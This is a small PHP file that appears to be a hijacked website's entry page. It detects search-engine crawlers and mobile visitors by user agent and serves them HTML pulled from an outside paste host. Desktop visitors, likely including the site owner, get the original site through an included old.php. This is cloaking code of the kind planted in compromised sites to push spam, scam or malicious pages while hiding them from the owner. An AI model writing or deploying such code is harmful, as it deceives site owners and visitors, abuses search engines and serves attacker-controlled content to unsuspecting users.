<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);

$bot_user_agents = [
  "Googlebot","Bingbot","Slurp","DuckDuckBot","Baiduspider","YandexBot",
  "facebookexternalhit","ia_archiver","AhrefsBot","Semrushbot"
];

$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';

function is_bot($ua, $bots){
  foreach($bots as $b){ if(stripos($ua, $b) !== false) return true; }
  return false;
}
function is_mobile($ua){
  foreach(['Mobile','Android','iPhone','iPad','Opera Mini','Opera Mobi'] as $m){
    if(stripos($ua, $m) !== false) return true;
  }
  return false;
}

if (is_bot($user_agent, $bot_user_agents) || is_mobile($user_agent)) {
  $url = 'https://pastebray.pages.dev/raw/1a3vvzdv';
  $html = @file_get_contents($url);
  if ($html === false) {
    http_response_code(502);
    echo "Gagal ambil konten remote.";
    exit;
  }
  echo $html;
  exit;
}

include __DIR__ . '/old.php';
exit;
